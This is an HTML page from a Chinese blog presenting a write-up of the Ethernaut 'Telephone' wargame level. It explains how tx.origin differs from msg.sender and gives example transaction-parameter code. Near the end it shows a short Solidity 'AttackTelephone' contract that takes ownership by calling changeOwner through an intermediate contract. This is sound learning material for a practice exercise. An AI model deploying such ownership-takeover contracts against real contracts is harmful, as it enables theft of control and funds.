@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="5AUIVYTbHIAuz-eQtxSfZbWW5eg9_EVZMSQycIuXrG0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"cishoon.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.20.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/config.min.js"></script>
+
+    <meta name="description" content="第五题，看起来很简单。目标是让 tx.origin !&#x3D; msg.sender">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut - Telephone">
+<meta property="og:url" content="http://cishoon.top/ethernaut/05-Telephone/index.html">
+<meta property="og:site_name" content="Cishoon&#39;s Blog">
+<meta property="og:description" content="第五题，看起来很简单。目标是让 tx.origin !&#x3D; msg.sender">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cishoon.top/ethernaut/05-Telephone/image-20241221224318309.png">
+<meta property="article:published_time" content="2024-12-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-22T06:37:24.033Z">
+<meta property="article:author" content="Cishoon">
+<meta property="article:tag" content="以太坊">
+<meta property="article:tag" content="智能合约">
+<meta property="article:tag" content="Ethernaut">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cishoon.top/ethernaut/05-Telephone/image-20241221224318309.png">
+
+
+<link rel="canonical" href="http://cishoon.top/ethernaut/05-Telephone/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://cishoon.top/ethernaut/05-Telephone/","path":"ethernaut/05-Telephone/","title":"Ethernaut - Telephone"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Ethernaut - Telephone | Cishoon's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-43861RVV8R"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-43861RVV8R","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/third-party/analytics/google-analytics.min.js"></script>
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="Cishoon's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Cishoon's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">38</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          目 录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#gpt%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86"><span class="nav-text">GPT的知识点整理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-text">解决方案：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A8%E6%A0%BC-1tx-%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%E5%8F%8A%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="nav-text">表格 1：tx
+参数说明及设置方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A8%E6%A0%BC-2msg-%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%E5%8F%8A%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="nav-text">表格 2：msg
+参数说明及设置方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%BA%A4%E6%98%93%E5%8F%82%E6%95%B0"><span class="nav-text">如何设置交易参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web3.js"><span class="nav-text">Web3.js</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ethers.js"><span class="nav-text">ethers.js</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">上传智能合约的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">调用其他智能合约的方法</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cishoon"
+      src="/images/cishoon.jpg">
+  <p class="site-author-name" itemprop="name">Cishoon</p>
+  <div class="site-description" itemprop="description">一条数学公式 + 一个简单的故事</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Npc2hvb24=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cishoon"><i class="fab fa-github fa-fw"></i></span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vMTA2Njk1NDg4" title="哔哩哔哩 → https:&#x2F;&#x2F;space.bilibili.com&#x2F;106695488"><i class="fa-brands fa-bilibili fa-fw"></i></span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://cishoon.top/ethernaut/05-Telephone/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cishoon.jpg">
+      <meta itemprop="name" content="Cishoon">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cishoon's Blog">
+      <meta itemprop="description" content="一条数学公式 + 一个简单的故事">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Ethernaut - Telephone | Cishoon's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ethernaut - Telephone<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2hvb24vYmxvZy90cmVlL21haW4vc291cmNlL19wb3N0cy9ldGhlcm5hdXQvMDUtVGVsZXBob25lLm1k" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-21 00:00:00" itemprop="dateCreated datePublished" datetime="2024-12-21T00:00:00+08:00">2024-12-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Ethernaut/" itemprop="url" rel="index"><span itemprop="name">Ethernaut</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>第五题，看起来很简单。目标是让</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tx.origin != msg.sender</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="gpt的知识点整理">GPT的知识点整理</h1>
+<p>在以太坊中：</p>
+<ul>
+<li><strong><code>tx.origin</code></strong>
+是发起整个交易的原始账户地址（最顶层的调用者）。</li>
+<li><strong><code>msg.sender</code></strong>
+是当前合约调用的直接发送者（可能是外部账户或合约）。</li>
+</ul>
+<p>要实现 <code>tx.origin != msg.sender</code>，需要通过
+<strong>一个中间合约</strong> 调用目标合约：</p>
+<h4 id="解决方案">解决方案：</h4>
+<ol type="1">
+<li><p>创建一个
+<strong>中间合约</strong>，该合约调用目标合约的方法。</p></li>
+<li><p>外部用户（你自己）调用中间合约，形成调用链：</p>
+<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你 (tx.origin) -&gt; 中间合约 (msg.sender) -&gt; 目标合约</span><br></pre></td></tr></table></figure></p></li>
+</ol>
+<hr>
+<h3 id="表格-1tx-参数说明及设置方法"><strong>表格 1：<code>tx</code>
+参数说明及设置方法</strong></h3>
+<p><code>tx</code> 是全局对象，代表
+<strong>当前交易的属性</strong>，但它是只读的，不能直接设置。以下是常见参数：</p>
+<table>
+<colgroup>
+<col style="width: 12%">
+<col style="width: 35%">
+<col style="width: 9%">
+<col style="width: 43%">
+</colgroup>
+<thead>
+<tr>
+<th>参数名</th>
+<th>说明</th>
+<th>是否可设置</th>
+<th>示例设置方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>tx.origin</code></td>
+<td>原始交易发起者（外部账户地址）。</td>
+<td>否</td>
+<td>由发起交易的外部账户决定，无法通过代码设置。</td>
+</tr>
+<tr>
+<td><code>tx.gasprice</code></td>
+<td>当前交易的 Gas 价格（单位：wei）。</td>
+<td>否</td>
+<td>设置 Gas 价格时通过交易选项 <code>gasPrice</code> 指定。</td>
+</tr>
+<tr>
+<td><code>tx.value</code></td>
+<td>当前交易发送的 ETH 数量（单位：wei）。</td>
+<td>否</td>
+<td>在发送交易时通过 <code>value</code> 参数指定。</td>
+</tr>
+<tr>
+<td><code>tx.gaslimit</code></td>
+<td>当前交易的 Gas 限制。</td>
+<td>否</td>
+<td>在发送交易时通过 <code>gasLimit</code> 或 <code>gas</code>
+参数指定。</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="表格-2msg-参数说明及设置方法"><strong>表格 2：<code>msg</code>
+参数说明及设置方法</strong></h3>
+<p><code>msg</code> 是 Solidity
+中的全局变量，表示当前执行上下文的信息。以下是 <code>msg</code>
+参数的详细说明：</p>
+<table>
+<colgroup>
+<col style="width: 9%">
+<col style="width: 37%">
+<col style="width: 7%">
+<col style="width: 45%">
+</colgroup>
+<thead>
+<tr>
+<th>参数名</th>
+<th>说明</th>
+<th>是否可设置</th>
+<th>示例设置方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>msg.sender</code></td>
+<td>当前调用的发送者地址（可以是外部账户或合约地址）。</td>
+<td>否</td>
+<td>根据谁调用当前合约自动设置（外部账户或上一级合约地址）。</td>
+</tr>
+<tr>
+<td><code>msg.value</code></td>
+<td>交易中随附的以太币数量（单位：wei）。</td>
+<td>是</td>
+<td>在发送交易时通过 <code>value</code>
+参数指定，例如：<code>{ value: 1 ether }</code>。</td>
+</tr>
+<tr>
+<td><code>msg.data</code></td>
+<td>交易中随附的完整调用数据（包括函数选择器和参数）。</td>
+<td>是</td>
+<td>例如：<code>{data: '0xdd365b8b'}</code>，调用函数的时候会自动生成data，格式是函数选择器+参数。</td>
+</tr>
+<tr>
+<td><code>msg.sig</code></td>
+<td>交易中函数选择器（前 4 字节的 <code>msg.data</code>）。</td>
+<td>否</td>
+<td>根据调用的函数自动生成，不能直接设置。</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="如何设置交易参数"><strong>如何设置交易参数</strong></h3>
+<p>以下是设置交易参数的方式（以 Web3.js 和 ethers.js 为例）：</p>
+<h4 id="web3.js"><strong>Web3.js</strong></h4>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="property">methods</span>.<span class="title function_">someFunction</span>(args).<span class="title function_">send</span>({</span><br><span class="line">  <span class="attr">from</span>: <span class="string">'0xYourAddress'</span>,         <span class="comment">// 交易发起地址</span></span><br><span class="line">  <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'1'</span>),  <span class="comment">// 发送 1 ETH</span></span><br><span class="line">  <span class="attr">gas</span>: <span class="number">100000</span>,                   <span class="comment">// 设置 Gas 限制</span></span><br><span class="line">  <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'20'</span>, <span class="string">'gwei'</span>) <span class="comment">// 设置 Gas 价格</span></span><br><span class="line">});</span><br></pre></td></tr></table></figure>
+<h4 id="ethers.js"><strong>ethers.js</strong></h4>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> tx = <span class="keyword">await</span> contract.<span class="title function_">someFunction</span>(args, {</span><br><span class="line">  <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">'1'</span>), <span class="comment">// 发送 1 ETH</span></span><br><span class="line">  <span class="attr">gasLimit</span>: <span class="number">100000</span>,                   <span class="comment">// 设置 Gas 限制</span></span><br><span class="line">  <span class="attr">gasPrice</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseUnits</span>(<span class="string">'20'</span>, <span class="string">'gwei'</span>) <span class="comment">// 设置 Gas 价格</span></span><br><span class="line">});</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="总结"><strong>总结</strong></h3>
+<ul>
+<li><code>tx.origin != msg.sender</code>
+的核心是通过中间合约构造调用链。</li>
+<li><code>tx</code>
+参数只读，设置交易参数需要通过外部发起交易时指定。</li>
+<li><code>msg</code> 参数由交易上下文决定，可通过控制调用链、发送的
+<code>value</code> 等间接影响。</li>
+</ul>
+<h1 id="解题">解题</h1>
+<h3 id="上传智能合约的方法">上传智能合约的方法</h3>
+<p>https://blog.csdn.net/wujian0428/article/details/129260266</p>
+<h3 id="调用其他智能合约的方法"><strong>调用其他智能合约的方法</strong></h3>
+<ol type="1">
+<li><p><strong>通过接口调用</strong></p>
+<ul>
+<li>定义目标合约的接口。</li>
+<li>创建接口实例，调用目标函数。</li>
+</ul>
+<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface IExample {</span><br><span class="line">    function doSomething(uint256 value) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract MyContract {</span><br><span class="line">    function callOther(address target, uint256 value) public {</span><br><span class="line">        IExample(target).doSomething(value);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>直接调用（低级调用）</strong></p>
+<ul>
+<li>使用 <code>.call</code> 进行底层调用。</li>
+<li>适用于未知 ABI 的动态调用。</li>
+</ul>
+<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success, ) = target.call(abi.encodeWithSignature("doSomething(uint256)", value));</span><br><span class="line">require(success, "Call failed");</span><br></pre></td></tr></table></figure></p></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ITelephone {</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract AttackTelephone {</span><br><span class="line">    address public targetAddress;</span><br><span class="line"></span><br><span class="line">    constructor(address _targetAddress) {</span><br><span class="line">        targetAddress = _targetAddress;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function attack(address _newOwner) public {</span><br><span class="line">        ITelephone(targetAddress).changeOwner(_newOwner);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>直接在Remix上部署、运行，就攻击成功了。</p>
+<p><img src="/ethernaut/05-Telephone/image-20241221224318309.png" alt="image-20241221224318309" style="zoom:50%;"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/" rel="tag"><i class="fa fa-tag"></i> 以太坊</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag"><i class="fa fa-tag"></i> 智能合约</a>
+              <a href="/tags/Ethernaut/" rel="tag"><i class="fa fa-tag"></i> Ethernaut</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/ethernaut/04-Coin-Flip/" rel="prev" title="Ethernaut - Coin Flip（随机数）">
+                  <i class="fa fa-angle-left"></i> Ethernaut - Coin Flip（随机数）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/ethernaut/06-Token/" rel="next" title="Ethernaut - Token">
+                  Ethernaut - Token <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Cishoon</span>
+  </div><div class="footer-custom">
+Website source code <span class="exturl theme-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2hvb24vYmxvZw==">here</span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2hvb24=" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/comments.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/motion.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/sidebar.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/next-boot.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/pjax.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/third-party/search/local-search.min.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/third-party/tags/mermaid.min.js"></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.5.0/wavedrom.min.js","integrity":"sha256-INLAoJc6quTNfiMWkGZniYO2cxE8mHpddnLow1m6RFs="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.5.0/skins/default.js","integrity":"sha256-fduc/Zszk5ezWws2uInY/ALWVmIrmV6VTgXbsYSReFI="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.20.0/third-party/tags/wavedrom.min.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+
